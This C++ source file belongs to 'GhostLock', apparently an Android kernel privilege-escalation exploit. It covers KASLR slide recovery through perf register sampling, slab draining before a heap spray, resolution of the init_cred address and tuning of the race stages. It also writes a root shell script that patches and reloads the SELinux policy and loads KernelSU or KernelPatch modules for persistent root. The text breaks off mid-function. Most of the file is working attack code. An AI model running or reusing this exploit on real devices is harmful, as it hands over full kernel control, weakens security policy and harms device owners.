/*
 * GhostLock — attack primitives, launch/profile selection and timing.
 *
 * Split out of main.cpp so the orchestration entry stays a thin adapter. The
 * statement order and log text are unchanged from the original translation
 * unit.
 */

#include "attack/ops.hpp"
#include "support/fatal_error.hpp"

#include "session/exploit_session.hpp"

#include <algorithm>
#include <array>
#include <string>
#include <string_view>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>

namespace ghostlock::attack {

    uint64_t recover_image_base_self(void);
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (session::g_exploit_session.addresses.init(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                session::g_exploit_session.addresses.soc_name(&session::g_exploit_session.profile),
                (unsigned long long) session::g_exploit_session.addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) session::g_exploit_session.addresses.init_cred_image_addr(),
                (size_t) session::g_exploit_session.addresses.data_alias(
                    session::g_exploit_session.addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
        /* KASLR slide recovery is a sampling race: a quiet CPU can produce a
         * histogram with no __schedule hit, which used to fall back to the
         * link-time base and quietly poison every later address.  Retry a few
         * times instead of accepting the fallback. */
        for (int32_t attempt = 0; attempt < 6; attempt++) {
            if (recover_image_base_self()) break;
        }
        pr_success("resolved profile loaded: %s\n",
                   session::g_exploit_session.profile.release());
        if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(session::g_exploit_session.profile.values());
        resolve_profile_addresses();
    }

    /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
     * A nested bank lies inside its parent, so it cannot widen either bound. */
    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
        unsigned long long base = 0, top = 0;
        char *line = nullptr;
        size_t cap = 0;
        int32_t found = 0;

        while (getline(&line, &cap, f) > 0) {
            size_t len = strlen(line);
            unsigned long long a, b;
            int32_t used = 0;

            while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
            /* %n pins the match to the whole line, since sscanf returns 2 even when
             * a trailing literal mismatches */
            if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
                used == static_cast<int32_t>(len)) {
                if (!found || a < base) {
                    base = a;
                    found = 1;
                }
                if (b + 1 > top) top = b + 1;
            }
        }
        /* Kept as the C getline/free pair: the ScopeExit experiment grew
         * run_setup_stage by 5 instructions (CPP17 review, rejected). */
        free(line);

        /* the map starts at the dram base the kernel rounded down to a gib, which
         * is what memstart_addr holds */
        base &= ~((1ULL << 30) - 1);
        if (!found || top <= base) return 0;
        *map_span = top - base;
        return 1;
    }

    /* A rooted run leaves its /proc/iomem in the home dir, the only source for
     * this unit's direct map size. */
    void apply_iomem_cache(void) {
        std::array < char, 320 > path{};
        std::array < char, 192 > stamp{};
        uint64_t span = 0;
        int32_t ok = 0;
        const profile::kernel_offsets *values =
                session::g_exploit_session.profile.values();
        const char *release = values && values->uname_r ? values->uname_r : "";

        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
        if (FILE *f = fopen(path.data(), "r")) {
            auto close_iomem = ghostlock::support::make_scope_exit(
                [f]() noexcept { fclose(f); });
            /* the first line names the release that wrote the dump */
            if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
                /* strcspn returns an index inside the buffer; the store writes the
                 * terminating NUL at worst on the last byte. */
                stamp[strcspn(stamp.data(), "\r\n")] = '\0'; // NOLINT(clang-analyzer-security.ArrayBound)
                const std::string_view stamp_view(stamp.data());
                ok = stamp_view.starts_with("# ") &&
                     stamp_view.substr(2) == release &&
                     iomem_map_span(f, &span);
            }
        }

        /* the base is rounded down to a gib, so a span under that holds no real
         * bank, and the span has to cover the dram the unit reports. it also
         * stays inside the bound the built-in geometry already uses, so a measured
         * end can only narrow what this build would otherwise trust. an
         * unmeasurable ram rejects the dump */
        long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
        uint64_t dram = (pages > 0 && page_sz > 0)
                            ? static_cast<uint64_t>(pages) * static_cast<uint64_t>(page_sz)
                            : 0;
        if (!ok || !dram || span < (1ULL << 30) || span < dram ||
            span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
            pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
            return;
        }

        kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
        pr_info("iomem cache: direct_map_end=%016llx\n",
                (unsigned long long) kernel::g_direct_map_end);
    }

    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    void write_root_script(void) {
        std::string script(12288, '\0');
        support::UniqueFd sfd(
            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
        if (!sfd.valid()) {
            pr_warning("open root script failed path=%s errno=%d\n",
                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
            return;
        }

        int32_t n = snprintf(
            script.data(), script.size(),
            "#!/system/bin/sh\n"
            "HOME_DIR='%s'\n"
            "LOG='%s'\n"
            "SAFE_MODE=%d\n"
            "LOADER_PREF=%u\n"
            "KSUD=\"$HOME_DIR/ksud\"\n"
            "APD=\"$HOME_DIR/libapd.so\"\n"
            "APKO=\"$HOME_DIR/kernelpatch.ko\"\n"
            "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
            "chmod 644 \"$LOG\" 2>/dev/null\n"
            "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "if [ ! -x \"$APD\" ]; then\n"
            "  for p in /data/app/*/me.bmax.apatch*/lib/arm64/libapd.so; do [ -x \"$p\" ] && APD=\"$p\" && break; done\n"
            "fi\n"
            "echo \"[*] apd=$APD\" >>\"$LOG\"\n"
            "echo \"[*] apko=$APKO file=$(ls -l \"$APKO\" 2>/dev/null)\" >>\"$LOG\"\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
            "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
            "if [ \"$(id -u)\" -ne 0 ]; then\n"
            "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            /* the rename is atomic, so a failed read leaves the old dump in place */
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
            "fi\n"
            /* debug archive: copy kernel/pstore/iomem evidence into the
             * --dump-kernel-log directory (empty disables the dump). */
            "DEBUG_DIR=\"%s\"\n"
            "dump_debug() {\n"
            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
            "  mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || { echo \"[!] debug dump: cannot write $DEBUG_DIR\" >>\"$LOG\"; return 0; }\n"
            "  {\n"
            "    echo '== uname -a =='\n"
            "    uname -a\n"
            "    echo '== /proc/version =='\n"
            "    cat /proc/version\n"
            "    echo '== /proc/cmdline =='\n"
            "    cat /proc/cmdline\n"
            "    echo '== /proc/modules =='\n"
            "    cat /proc/modules\n"
            "    echo '== selinux =='\n"
            "    getenforce 2>/dev/null\n"
            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
            "  fi\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
            "  done\n"
            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
            "}\n"
            "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
            "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
            "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
            "fi\n"
            "KVER=$(uname -r | cut -d. -f1-2)\n"
            "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "KMI=\"${AVER}-${KVER}\"\n"
            "# safe mode: disable all modules before exec ksud\n"
            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
            "  n=0\n"
            "  for m in /data/adb/modules/*/; do\n"
            "    [ -d \"$m\" ] || continue\n"
            "    if touch \"${m}disable\" 2>/dev/null; then\n"
            "      n=$((n+1))\n"
            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
            "    fi\n"
            "  done\n"
            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
            "fi\n"
            "# step 1: restore policy\n"
            "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
            "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
            "  exit 1\n"
            "}\n"
            "trap 'rm -f \"$POLICY\"; dump_debug' EXIT\n"
            "prepare_policy() {\n"
            "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
            "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
            "  case \"$HEADER\" in\n"
            "    8cff7cf9080000005345204c696e7578"
            "\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
            "    *) echo '[!] invalid policy header'; return 1 ;;\n"
            "  esac\n"
            "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
            "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
            "  [ -n \"$CONFIG\" ] || return 1\n"
            "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
            "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
            "}\n"
            "FIXUP_RC=1\n"
            "for i in $(seq 1 10); do\n"
            "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
            "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
            "    sleep 2\n"
            "    continue\n"
            "  fi\n"
            "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
            "  LPID=$!\n"
            "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
            "  SPID=$!\n"
            "  wait $LPID 2>/dev/null\n"
            "  FIXUP_RC=$?\n"
            "  kill $SPID 2>/dev/null\n"
            "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
            "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
            "      break\n"
            "    fi\n"
            "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
            "    FIXUP_RC=1\n"
            "  fi\n"
            "  sleep 2\n"
            "done\n"
            "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
            "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
            "elif grep -q '^kernelpatch[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelpatch already loaded; skipping insmod\" >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            "  echo \"[*] uname kmi=$KMI\" >>\"$LOG\"\n"
            "  # The loading binary is a profile decision\n"
            "  # (execution.handoff.module_loader): 0 = ksud (default), 1 = apd,\n"
            "  # 2 = legacy apd-first. The order decides what we TRY first and\n"
            "  # both the preference and the winner are logged, so an unexpected\n"
            "  # fallback shows up instead of passing silently.\n"
            "  # A missing first choice falls through to the other loader: a hard\n"
            "  # preference would strand single-manager devices.\n"
            "  # Note the app always drops ksud into HOME_DIR when a KernelSU\n"
            "  # family package exists, so KSUD's presence alone cannot tell the\n"
            "  # two managers apart (measured 2026-10-17: ksud matched and\n"
            "  # late-loaded kernelsu on an APatch-only device).\n"
            "  case \"$LOADER_PREF\" in\n"
            "    1|2) LOADER_ORDER=\"apd ksud\" ;;\n"
            "    *) LOADER_ORDER=\"ksud apd\" ;;\n"
            "  esac\n"
            "  LOADER=\"\"\n"
            "  for cand in $LOADER_ORDER; do\n"
            "    case \"$cand\" in\n"
            "      apd)\n"
            "        if [ -x \"$APD\" ]; then\n"
            "          if [ -f \"$APKO\" ] || ls /data/local/tmp/*kernelpatch*.ko >/dev/null 2>&1; then\n"
            "            LOADER=\"$APD\"\n"
            "            break\n"
            "          fi\n"
            "        fi\n"
            "        ;;\n"
            "      ksud)\n"
            "        if [ -x \"$KSUD\" ]; then\n"
            "          LOADER=\"$KSUD\"\n"
            "          break\n"
            "        fi\n"
            "        ;;\n"
            "    esac\n"
            "  done\n"
            "  if [ -z \"$LOADER\" ]; then\n"
            "    echo '[!] no usable loader: ksud and apd are both missing or unstaged' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  echo \"[*] loader=$LOADER pref=$LOADER_PREF\" >>\"$LOG\"\n"
            "  case \"$LOADER\" in\n"
            "    *libapd.so)\n"
            "      # APatch route (my2-proven 2026-09-11): kernelpatch.ko references 13\n"
            "      # symbols this 5.10 GKI does not export, so plain insmod always dies\n"
            "      # with ENOENT ('Unknown symbol kallsyms_lookup_name (err -2)'). apd's\n"
            "      # insmod subcommand does userspace ELF relocation against\n"
            "      # /proc/kallsyms (SHN_UNDEF -> SHN_ABS + address) and calls\n"
            "      # init_module; it never touches the SELinux policy, unlike apd\n"
            "      # late-load (whose apply_magisk_policy_live unlabels running\n"
            "      # services and kills system_server).\n"
            "      if [ ! -x \"$LOADER\" ]; then\n"
            "        echo '[!] APatch daemon not found; cannot insmod kernelpatch' >>\"$LOG\"\n"
            "        exit 1\n"
            "      fi\n"
            "      chmod 755 \"$LOADER\" 2>/dev/null\n"
            "      if [ ! -f \"$APKO\" ]; then\n"
            "        APKO=$(ls /data/local/tmp/*kernelpatch*.ko 2>/dev/null | head -1)\n"
            "      fi\n"
            "      if [ -z \"$APKO\" ] || [ ! -f \"$APKO\" ]; then\n"
            "        echo '[!] no kernelpatch .ko staged; expected $HOME_DIR/kernelpatch.ko or /data/local/tmp/' >>\"$LOG\"\n"
            "        exit 1\n"
            "      fi\n"
            "      echo \"[*] apd insmod kmi=$KMI ko=$APKO\" >>\"$LOG\"\n"
            "      \"$LOADER\" insmod \"$APKO\" >>\"$LOG\" 2>&1\n"
            "      IRC=$?\n"
            "      echo \"[*] apd insmod rc=$IRC\" >>\"$LOG\"\n"
            "      dmesg > \"$HOME_DIR/.ghostlock_dmesg2.log\" 2>/dev/null\n"
            "      echo \"[*] post-load dmesg: $(wc -c < \"$HOME_DIR/.ghostlock_dmesg2.log\" 2>/dev/null) bytes\" >>\"$LOG\"\n"
            "      # insmod only puts the module in the kernel. The APatch manager\n"
            "      # talks to a resident apd daemon instead of to the module, so\n"
            "      # without one it spawns probe shells that park in pipe_read and\n"
            "      # the UI ANRs after five seconds (measured 2026-10-27). Replay\n"
            "      # APatch's own boot order to provide that half as well. Nothing\n"
            "      # here may fail the handoff: su works through a one-shot exec\n"
            "      # redirect and never needs the daemon.\n"
            "      if [ \"$IRC\" -eq 0 ]; then\n"
            "        KERNELPATCH_VERSION=$(cat /sys/module/kernelpatch/version 2>/dev/null)\n"
            "        KERNEL_VERSION=$(uname -r)\n"
            "        export KERNELPATCH_VERSION KERNEL_VERSION\n"
            "        # boot-completed registers the uid listener and then stays in\n"
            "        # the foreground, so it has to be detached rather than waited\n"
            "        # on. Every stage is backgrounded: run in the foreground one of\n"
            "        # them takes its caller down with it inside the handoff, and a\n"
            "        # stage must never cost us the handoff. pidof matches the staged\n"
            "        # name too, which is what makes a second run in the same boot\n"
            "        # idempotent.\n"
            "        if [ -z \"$(pidof apd libapd.so)\" ]; then\n"
            "          ( \"$LOADER\" post-fs-data; \"$LOADER\" services ) </dev/null >>\"$LOG\" 2>&1 &\n"
            "          echo \"[*] apd boot stages bg pid=$!\" >>\"$LOG\"\n"
            "          \"$LOADER\" boot-completed </dev/null >>\"$LOG\" 2>&1 &\n"
            "          APD_BG=$!\n"
            "          APD_WAIT=0\n"
            "          while [ \"$APD_WAIT\" -lt 30 ]; do\n"
            "            [ -r \"/proc/$APD_BG/cmdline\" ] && break\n"
            "            APD_WAIT=$((APD_WAIT + 1))\n"
            "            sleep 0.1\n"
            "          done\n"
            "          if [ -r \"/proc/$APD_BG/cmdline\" ]; then\n"
            "            echo \"[*] apd daemon pid=$APD_BG alive=1\" >>\"$LOG\"\n"
            "          else\n"
            "            echo '[!] apd daemon did not stay up; manager UI may hang' >>\"$LOG\"\n"
            "          fi\n"
            "        else\n"
            "          echo \"[*] apd daemon already running pid=$(pidof apd libapd.so)\" >>\"$LOG\"\n"
            "        fi\n"
            "      fi\n"
            "      ;;\n"
            "    *)\n"
            "      if [ ! -x \"$LOADER\" ]; then\n"
            "        echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
            "        exit 1\n"
            "      fi\n"
            "      echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
            "      chmod 755 \"$LOADER\" 2>/dev/null\n"
            "      \"$LOADER\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "      echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "      ;;\n"
            "  esac\n"
            "fi\n"
            "echo \"[*] temp su uid=$(id -u); watching kernelsu/kernelpatch module\" >>\"$LOG\"\n"
            "KSU_READY=0\n"
            "for i in $(seq 1 50); do\n"
            "  if grep -qE 'kernelsu|kernelpatch' /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
            "  sleep 0.1\n"
            "done\n"
            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
            "  echo '[!] KernelSU/KernelPatch module not loaded' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
            "  echo \"[*] module already loaded; restoring enforcing\" >>\"$LOG\"\n"
            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "fi\n"
            "else\n"
            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
            "fi\n",
            (config::runtime_config_snapshot().home_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()),
            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
            session::g_exploit_session.profile.handoff_module_loader(),
            (config::runtime_config_snapshot().debug_dir.c_str()));
        if (n < 0 || n >= static_cast<int32_t>(script.size())) {
            pr_warning("root script too long\n");
            return;
        }
        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
            pr_warning("write root script failed errno=%d\n", errno);
        }
        sfd.reset();
        chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                n);
    }

    /* Find a task through perf sample records. */

    /* Callee-saved sampling of a sleeping thread.
     *
     * The vote over all 32 registers only works on kernels whose tag scheme
     * leaves one register holding `current` at every sample point. This 4.14
     * MTK kernel keeps `current` in sp_el0, which perf does not export, so the
     * all-register vote returns a constant that is not a task at all (seen:
     * 0xffffff80ffffffd0 with ~17% of the samples).
     *
     * In kernel mode the task pointer is nevertheless live in the callee-saved
     * set across every schedule(): a thread parked in nanosleep is sampled
     * inside the timer/scheduler paths, where x19..x28 hold it. Sampling only
     * x19..x28 of a *sleeping* thread therefore observes one value repeatedly
     * instead of 32 registers of noise.
     */
    /* Recovered once per boot from the kernel text anchor (see below). */
    static uint64_t g_kernel_slide = 0;

    uintptr_t perf_find_task_sleeping(void) {
        int32_t pipefd[2];
        if (pipe(pipefd) != 0) return 0;
        const pid_t child = fork();
        if (child < 0) {
            close(pipefd[0]);
            close(pipefd[1]);
            return 0;
        }
        if (child == 0) {
            close(pipefd[0]);
            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
            (void) ignored;
            close(pipefd[1]);
            /* Block in pipe_read(): read() -> pipe_read() -> schedule(), and
             * pipe_read keeps `current`-derived state in callee-saved
             * registers across the block. */
            char byte = 0;
            for (;;) (void) read(pipefd[0], &byte, 0);
        }
        close(pipefd[1]);
        pid_t tid = 0;
        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
            close(pipefd[0]);
            kill(child, SIGKILL);
            return 0;
        }
        close(pipefd[0]);

        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 2000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        /* PERF_REG_ARM64_X19 .. X28 */
        /* Every register, but only samples taken inside __schedule() /
         * finish_task_switch(): there prev/next (task_struct *) are live in
         * x19..x28 for the whole function, so the PC filter removes the
         * stack-pointer and garbage dominated samples. Addresses come from the
         * shipped image (see .g14/derive/honor.syms). */
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("sleeping perf_event_open failed errno=%d\n", errno);
            kill(child, SIGKILL);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 64;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            kill(child, SIGKILL);
            return 0;
        }
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        struct timespec nap = {.tv_sec = 0, .tv_nsec = 250000000};
        syscall(__NR_nanosleep, &nap, nullptr);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
